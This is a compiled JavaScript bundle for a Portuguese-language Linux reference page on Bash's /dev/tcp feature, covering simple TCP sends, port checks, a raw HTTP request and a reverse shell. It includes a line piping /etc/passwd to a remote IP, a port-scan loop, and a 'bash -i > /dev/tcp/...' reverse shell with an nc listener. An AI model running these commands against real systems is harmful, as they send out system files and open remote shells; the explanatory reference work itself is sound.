"use strict";(self.webpackChunkmy_docs=self.webpackChunkmy_docs||[]).push([[9093],{2908:(e,n,o)=>{o.r(n),o.d(n,{assets:()=>d,contentTitle:()=>a,default:()=>p,frontMatter:()=>c,metadata:()=>i,toc:()=>t});var s=o(4848),r=o(8453);const c={id:"dev_tcp",title:"/dev/tcp/"},a=void 0,i={id:"linux/dev_tcp",title:"/dev/tcp/",description:"O /dev/tcp/ no Linux \xe9 uma funcionalidade especial do interpretador de",source:"@site/docs/linux/dev_tcp.mdx",sourceDirName:"linux",slug:"/linux/dev_tcp",permalink:"/my-docs/docs/linux/dev_tcp",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{id:"dev_tcp",title:"/dev/tcp/"},sidebar:"tutorialSidebar",previous:{title:"dd",permalink:"/my-docs/docs/linux/dd"},next:{title:"dig",permalink:"/my-docs/docs/linux/dig"}},d={},t=[{value:"Como funciona?",id:"como-funciona",level:2},{value:"Uso Simples",id:"uso-simples",level:2},{value:"Verificando Portas",id:"verificando-portas",level:2},{value:"Request HTTP",id:"request-http",level:2},{value:"TCP Shell Reverso",id:"tcp-shell-reverso",level:2}];function l(e){const n={a:"a",admonition:"admonition",code:"code",em:"em",h2:"h2",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(n.p,{children:["O ",(0,s.jsx)(n.code,{children:"/dev/tcp/"})," no Linux \xe9 uma funcionalidade especial do interpretador de\ncomandos Bash que permite realizar conex\xf5es TCP diretamente atrav\xe9s do sistema\nde arquivos. Ele n\xe3o \xe9 um arquivo real no ",(0,s.jsx)(n.code,{children:"/dev"}),", mas sim um recurso interno do\nBash para abrir conex\xf5es de rede de forma simples."]}),"\n",(0,s.jsx)(n.h2,{id:"como-funciona",children:"Como funciona?"}),"\n",(0,s.jsxs)(n.p,{children:["O Bash interpreta ",(0,s.jsx)(n.code,{children:"/dev/tcp/<host>/<porta>"})," como uma tentativa de abrir uma\nconex\xe3o TCP com o host e a porta especificados. Se a conex\xe3o for bem-sucedida,\nvoc\xea pode enviar e receber dados como se estivesse lidando com um arquivo."]}),"\n",(0,s.jsx)(n.h2,{id:"uso-simples",children:"Uso Simples"}),"\n",(0,s.jsx)(n.p,{children:"Abaixo estaremos enviando um 'hi' para o IP 172.16.0.2 na porta 4444:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"echo 'hi' > /dev/tcp/172.16.0.2/4444\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"cat /etc/passwd > /dev/tcp/172.16.0.2/4444\n"})}),"\n",(0,s.jsx)(n.h2,{id:"verificando-portas",children:"Verificando Portas"}),"\n",(0,s.jsxs)(n.p,{children:["Ao tentar fazer uma conex\xe3o utilizando o ",(0,s.jsx)(n.code,{children:"/dev/tcp"}),", caso o endpoint n\xe3o esteja\nacess\xedvel ir\xe1 retornar o c\xf3digo 1 de erro."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:">/dev/tcp/172.16.0.2/4444\necho $?\n"})}),"\n",(0,s.jsx)(n.p,{children:"Com base no conceito do comando de cima \xe9 poss\xedvel fazer uma l\xf3gica para\ndeterminar de forma mais amig\xe1vel se a porta est\xe1 aberta em determinado host\n(IP ou hostname)."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'{ echo > /dev/tcp/google.com/80; } 2>/dev/null && \\\n    echo "Open port" || echo "Closed port"\n'})}),"\n",(0,s.jsxs)(n.p,{children:["Com isso \xe9 poss\xedvel fazer um ",(0,s.jsx)(n.em,{children:"portscan"})," simples:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"seq 1 1000 | xargs -I{} bash -c '\n    { echo > /dev/tcp/192.168.0.1/{}; } 2>/dev/null && \\\n    echo \"{} Open port\"\n'\n"})}),"\n",(0,s.jsx)(n.h2,{id:"request-http",children:"Request HTTP"}),"\n",(0,s.jsxs)(n.p,{children:["Para fazer uma requisi\xe7\xe3o HTTP utilizando o ",(0,s.jsx)(n.code,{children:"/dev/tcp"})," \xe9 um pouco complicado,\npois precisamos utilizar ",(0,s.jsx)(n.em,{children:"file descriptor"}),", por\xe9m se torna \xfatil em ambientes sem\no ",(0,s.jsx)(n.code,{children:"curl"})," ou limitados como por exemplos os ambientes conteinerizados."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'exec 3<>/dev/tcp/example.com/80\necho -e "GET / HTTP/1.1\\r\\nHost: example.com\\r\\nConnection: close\\r\\n\\r\\n" >&3\ncat <&3\nexec 3>&-\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Refer\xeancias:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://rednafi.com/misc/http_requests_via_dev_tcp/",children:"HTTP requests via /dev/tcp"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://blog.pantuza.com/artigos/o-que-sao-file-descriptors",children:"O que s\xe3o file descriptors"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://copyconstruct.medium.com/bash-redirection-fun-with-descriptors-e799ec5a3c16",children:"Bash redirection fun with descriptors"})}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"tcp-shell-reverso",children:"TCP Shell Reverso"}),"\n",(0,s.jsxs)(n.p,{children:["No server que ir\xe1 receber a conex\xe3o reversa com o ",(0,s.jsx)(n.em,{children:"shell"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -l 4444\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Na m\xe1quina alvo que ir\xe1 fazer a conex\xe3o reversa e passar a ",(0,s.jsx)(n.em,{children:"shell"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"bash -i > /dev/tcp/172.16.0.1/4444 0>&1 2>&1\n"})}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsx)(n.p,{children:"Para recapitular, abaixo temos o c\xf3digo de cada fluxo padr\xe3o:"}),(0,s.jsx)(n.p,{children:"STDIN: 0\nSTDOUT: 1\nSTDERR: 2"}),(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:">&1"})," faz com que STDIN seja redirecionado para o mesmo destino de STDOUT, ou\nseja, os dados recebidos da conex\xe3o TCP agora s\xe3o tratados como entrada para o\nBash interativo e o mesmo acontece com o STDERR (",(0,s.jsx)(n.code,{children:"2>&1"}),")."]})]})]})}function p(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},8453:(e,n,o)=>{o.d(n,{R:()=>a,x:()=>i});var s=o(6540);const r={},c=s.createContext(r);function a(e){const n=s.useContext(c);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),s.createElement(c.Provider,{value:n},e.children)}}}]);